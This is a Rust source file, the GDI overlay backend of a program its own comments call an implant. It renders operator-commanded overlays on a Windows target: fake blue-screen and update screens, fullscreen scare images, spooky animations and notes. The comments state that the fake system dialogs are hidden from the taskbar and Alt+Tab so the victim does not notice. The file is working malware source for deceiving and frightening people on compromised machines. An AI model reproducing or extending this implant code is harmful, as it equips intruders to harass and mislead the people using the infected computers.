//! The GDI overlay backend.
//!
//! This exists because the eframe backend cannot run everywhere. eframe needs a
//! working OpenGL 3.2 implementation, and a target without one - a bare VM with
//! 3D acceleration off, most obviously an RDP session - makes it fail during
//! context creation, before the first frame, with a panic from inside glutin
//! rather than an error anyone can read. On such a host every visual command
//! would be dead, and so would most of the implant's point.
//!
//! Nothing here touches OpenGL. Each overlay is an ordinary top-level Win32
//! window on its own thread with its own message loop, rasterised into a DIB and
//! handed to the window manager for compositing. That is a different shape from
//! the eframe backend - which needs a single shared event loop because winit
//! allows only one per process - and it is the shape that works with no graphics
//! driver at all.
//!
//! The trade is real and worth stating: this backend is a transcription, not a
//! port. It draws the same layouts in the same colours with the system font, but
//! it has no rounded corners, no subpixel layout and no GPU. On a machine where
//! eframe does work, eframe is still preferred; see `gui::sender`.

mod api;
mod canvas;
mod paint;
mod text;

use std::cell::RefCell;
use std::mem::MaybeUninit;
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::mpsc::Receiver;
use std::sync::Arc;
use std::time::{Instant, SystemTime};

use api::*;
use canvas::Canvas;
use paint::Content;
use text::TextRenderer;

use crate::gui::{
    current_stop_epoch, record_host_failure, register_active, unregister_active, Active, Overlay,
    Request,
};

/// The window class every overlay window is registered under.
const CLASS_NAME: &str = "midas-overlay";

/// How often a still overlay redraws.
///
/// Nothing else repaints a topmost window, so this is only about recovering if
/// something is drawn over it while the overlay sits at normal level - and about
/// honouring a `stopall` promptly. Once a second is ample.
const STILL_FRAME_MS: u32 = 500;

/// Fallback desktop size if the shell has not reported a usable screen.
const FALLBACK_SCREEN: (i32, i32) = (1920, 1080);

thread_local! {
    /// What the window procedure needs in order to decide a timer tick means
    /// "time to go".
    ///
    /// Thread-local rather than `SetWindowLongPtr`, because each window thread
    /// owns exactly one window and dispatches its own messages: the association
    /// is guaranteed by construction rather than maintained by hand. The
    /// procedure is deliberately kept free of drawing, so this never has to
    /// borrow the canvas and cannot deadlock against the loop body.
    static LIFETIME: RefCell<Option<Lifetime>> = const { RefCell::new(None) };
}

struct Lifetime {
    cancel: Arc<AtomicBool>,
    deadline: Option<Instant>,
}

impl Lifetime {
    fn expired(&self) -> bool {
        self.cancel.load(Ordering::SeqCst)
            || self.deadline.is_some_and(|deadline| Instant::now() >= deadline)
    }
}

// ---------------------------------------------------------------------------
// Dispatcher
// ---------------------------------------------------------------------------

/// The host thread. Blocks on the request channel for the life of the process.
pub(crate) fn run(rx: Receiver<Request>) {
    // Without this, a 1920x1080 window on a 150% display is virtualised to
    // 1280x720 and covers three quarters of the screen. Set once per process; if
    // the eframe backend already got here first this fails harmlessly.
    unsafe { SetProcessDPIAware() };

    let class: Vec<u16> = wide(CLASS_NAME);

    let registered = unsafe { RegisterClassExW(&window_class(&class)) };
    if registered == 0 {
        record_host_failure("the overlay window class could not be registered".to_string());
        return;
    }

    while let Ok(request) = rx.recv() {
        // A stop that landed between submission and this drain wins. See the
        // STOP_EPOCH note in gui/mod.rs.
        if request.epoch < current_stop_epoch() {
            continue;
        }

        let class = class.clone();
        // Detached: each window winds itself down through its own deadline and
        // cancel token, and nothing on the check-in thread waits for it.
        let _ = std::thread::Builder::new()
            .name(format!("midas-ovl-{}", request.id))
            .spawn(move || serve(request, class));
    }

    unsafe { UnregisterClassW(class.as_ptr(), std::ptr::null_mut()) };
}

// ---------------------------------------------------------------------------
// One overlay
// ---------------------------------------------------------------------------

/// Creates and runs a single overlay window.
///
/// The registry entry is cleared here rather than at the end of the window's
/// life, so that a bug in the rasteriser cannot leave `listoverlays` reporting
/// an overlay with no window behind it. The eframe backend has to clear its
/// ghosts explicitly for the same reason, and this is where the equivalent
/// guarantee lives on the GDI side.
fn serve(request: Request, class: Vec<u16>) {
    let id = request.id;

    let _ = std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| {
        serve_window(request, class)
    }));

    unregister_active(id);
}

fn serve_window(request: Request, class: Vec<u16>) {
    // Every fallible step bails through here so the registry is never left
    // holding an overlay that has no window behind it.
    let fail = |reason: String| {
        crate::log::log(&format!("overlay {} failed: {reason}", request.id));
        unregister_active(request.id);
    };

    let Some(mut text) = TextRenderer::new() else {
        fail("GDI would not allocate a drawing surface".to_string());
        return;
    };

    let content = match prepare(&request) {
        Ok(content) => content,
        Err(e) => {
            // Paths are checked before the ack is sent, so reaching here means the
            // file became unreadable, or stopped being a decodable image, in
            // between.
            fail(e);
            return;
        }
    };

    let screen = crate::gui::win::screen_size()
        .map(|(w, h)| (w as i32, h as i32))
        .unwrap_or(FALLBACK_SCREEN);

    let geometry = content.geometry(screen, &mut text);

    let mut ex_style = api::WS_EX_LAYERED | api::WS_EX_TOOLWINDOW | api::WS_EX_NOACTIVATE;
    if geometry.topmost {
        ex_style |= api::WS_EX_TOPMOST;
    }

    let hwnd = unsafe {
        CreateWindowExW(
            ex_style,
            class.as_ptr(),
            std::ptr::null(),
            api::WS_POPUP,
            geometry.x,
            geometry.y,
            geometry.width.max(1),
            geometry.height.max(1),
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            module_handle(),
            std::ptr::null_mut(),
        )
    };

    if hwnd.is_null() {
        fail("the overlay window could not be created".to_string());
        return;
    }

    let Some(canvas) = Canvas::new(geometry.width, geometry.height) else {
        unsafe { DestroyWindow(hwnd) };
        fail("GDI would not allocate a drawing surface".to_string());
        return;
    };

    let deadline = request.duration.map(|d| Instant::now() + d);

    LIFETIME.with(|cell| {
        *cell.borrow_mut() = Some(Lifetime {
            cancel: request.cancel.clone(),
            deadline,
        })
    });

    register_active(Active {
        id: request.id,
        label: request.kind.label(),
        born: SystemTime::now(),
        deadline,
        cancel: request.cancel,
    });

    // The timer is the only thing that drives the message loop, so it is also the
    // only thing that will ever end this overlay or animate it. A failure here
    // means the overlay stays up until `stopall`, which is worth saying out loud
    // rather than leaving the operator to wonder.
    let cadence = if content.animated() {
        paint::SPOOK_FRAME_MS
    } else {
        STILL_FRAME_MS
    };

    if unsafe { SetTimer(hwnd, TIMER_ID, cadence, std::ptr::null_mut()) } == 0 {
        crate::log::log(&format!(
            "overlay {}: could not start its repaint timer, it will stay up until stopall",
            request.id
        ));
    }

    let mut surface = Surface {
        canvas,
        text,
        content,
        origin: (geometry.x, geometry.y),
        started: Instant::now(),
        seed: request.id,
    };

    // The first frame is drawn before the pump starts so the window appears at
    // once rather than up to a tick later.
    surface.draw(&hwnd);
    unsafe { ShowWindow(hwnd, SW_SHOWNOACTIVATE) };

    loop {
        let mut message = MaybeUninit::<api::MSG>::uninit();
        let result = unsafe { GetMessageW(message.as_mut_ptr(), std::ptr::null_mut(), 0, 0) };

        // Zero is `WM_QUIT` from the `WM_DESTROY` handler, negative is an error.
        // Either way there is no more to dispatch.
        if result <= 0 {
            break;
        }

        let message = unsafe { message.assume_init() };
        let destroying = message.message == WM_DESTROY;

        unsafe {
            TranslateMessage(&message);
            DispatchMessageW(&message);
        }

        // The window is gone by the time `WM_DESTROY` returns, so there is
        // nothing left to composite into.
        if destroying {
            break;
        }

        surface.draw(&hwnd);
    }

    unsafe {
        KillTimer(hwnd, TIMER_ID);
        DestroyWindow(hwnd);
    }
    surface.canvas.release();
    LIFETIME.with(|cell| *cell.borrow_mut() = None);
}

/// Everything one overlay window needs in order to draw itself.
///
/// The window owns this for its lifetime, so the canvas and the scratch surface
/// inside the text renderer are allocated once and reused across frames.
struct Surface {
    canvas: Canvas,
    text: TextRenderer,
    content: Content,
    /// Where the window sits, in screen coordinates.
    origin: (i32, i32),
    started: Instant,
    /// Varies the procedural overlays between overlays, so two `spook` windows
    /// are not identical.
    seed: u64,
}

impl Surface {
    /// Rasterises one frame and hands it to the window manager.
    fn draw(&mut self, hwnd: &api::HWND) {
        // A still overlay is drawn once and then not again, so its elapsed time
        // is frozen at zero and an animation-based painter would show its first
        // frame forever. Nothing repaints a topmost window, so this costs
        // nothing to do honestly; a normal-level one is recovered by the
        // still-frame timer if something is drawn over it.
        let time = if self.content.animated() {
            self.started.elapsed().as_secs_f64()
        } else {
            0.0
        };

        self.canvas.wipe();
        self.content.draw(&mut self.canvas, &mut self.text, time, self.seed);
        self.canvas.present(*hwnd, self.origin);
    }
}

const TIMER_ID: usize = 1;

// ---------------------------------------------------------------------------
// Window class and procedure
// ---------------------------------------------------------------------------

fn window_class(name: &[u16]) -> api::WNDCLASSEXW {
    let instance = module_handle();
    let cursor = unsafe { LoadCursorW(std::ptr::null_mut(), api::IDC_ARROW as *const u16) };

    api::WNDCLASSEXW {
        cbSize: std::mem::size_of::<api::WNDCLASSEXW>() as api::UINT,
        style: api::CS_HREDRAW | api::CS_VREDRAW,
        lpfnWndProc: window_procedure,
        cbClsExtra: 0,
        cbWndExtra: 0,
        hInstance: instance,
        // No icon: a fake system dialog that shows up in the taskbar or Alt+Tab
        // would give the game away, which is what `WS_EX_TOOLWINDOW` prevents
        // anyway.
        hIcon: std::ptr::null_mut(),
        hCursor: cursor,
        // No background brush. Every pixel is written before the window is
        // composited, and a brush would flash the window's garbage contents.
        hbrBackground: std::ptr::null_mut(),
        lpszMenuName: std::ptr::null(),
        lpszClassName: name.as_ptr(),
        hIconSm: std::ptr::null_mut(),
    }
}

/// Handles only what the window needs. Everything else is left to Windows.
///
/// Notably there is no `WM_NCHITTEST` case: a layered window is hit-tested
/// against its own alpha, so a `desktopnote` that is only opaque where its
/// shadow and glyphs are already click-through, with no extra code.
unsafe extern "system" fn window_procedure(
    hwnd: api::HWND,
    message: api::UINT,
    wparam: api::WPARAM,
    lparam: api::LPARAM,
) -> api::LRESULT {
    match message {
        api::WM_TIMER => {
            let expired =
                LIFETIME.with(|cell| cell.borrow().as_ref().is_none_or(Lifetime::expired));
            if expired {
                DestroyWindow(hwnd);
            }
            0
        }

        // A layered window composites itself, so this should never arrive. If it
        // does, the window manager wants the region marked valid or it will keep
        // sending the message.
        api::WM_PAINT => {
            let mut paint = MaybeUninit::<api::PAINTSTRUCT>::uninit();
            let dc = BeginPaint(hwnd, paint.as_mut_ptr());
            if !dc.is_null() {
                EndPaint(hwnd, paint.as_mut_ptr());
            }
            0
        }

        api::WM_DESTROY => {
            PostQuitMessage(0);
            0
        }

        _ => DefWindowProcW(hwnd, message, wparam, lparam),
    }
}

// ---------------------------------------------------------------------------
// Preparation
// ---------------------------------------------------------------------------

fn prepare(request: &Request) -> Result<Content, String> {
    match &request.kind {
        Overlay::Image {
            path,
            mode,
            topmost,
        } => {
            let (pixels, width, height) = paint::load_image(path)?;
            Ok(Content::Image {
                pixels,
                width,
                height,
                mode: mode.clone(),
                topmost: *topmost,
            })
        }

        // A scare is just a fullscreen image; the sound half is played by the
        // command layer so this side stays purely visual.
        Overlay::Scare { path } => {
            let (pixels, width, height) = paint::load_image(path)?;
            Ok(Content::Image {
                pixels,
                width,
                height,
                mode: "fullscreen".to_string(),
                topmost: true,
            })
        }

        Overlay::Bsod { stopcode, percent } => Ok(Content::Bsod {
            stopcode: stopcode.clone(),
            percent: *percent,
        }),

        Overlay::Update { title, percent } => Ok(Content::Update {
            title: title.clone(),
            percent: *percent,
        }),

        Overlay::Toast { title, body } => Ok(Content::Toast {
            title: title.clone(),
            body: body.clone(),
        }),

        Overlay::Note { text, x, y, size } => Ok(Content::Note {
            text: text.clone(),
            x: *x as f32,
            y: *y as f32,
            size: *size as f32,
        }),

        Overlay::Spook { mode } => Ok(Content::Spook {
            mode: mode.clone(),
        }),
    }
}

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------

fn wide(text: &str) -> Vec<u16> {
    text.encode_utf16().chain(std::iter::once(0)).collect()
}

/// The handle of the running image, needed by both the class and every window.
///
/// Not cached: a raw handle is neither `Send` nor `Sync`, so caching one would
/// mean wrapping a pointer in an atomic to save a call that is already a lookup
/// in the loader's own cache.
fn module_handle() -> api::HINSTANCE {
    unsafe { GetModuleHandleW(std::ptr::null()) }
}
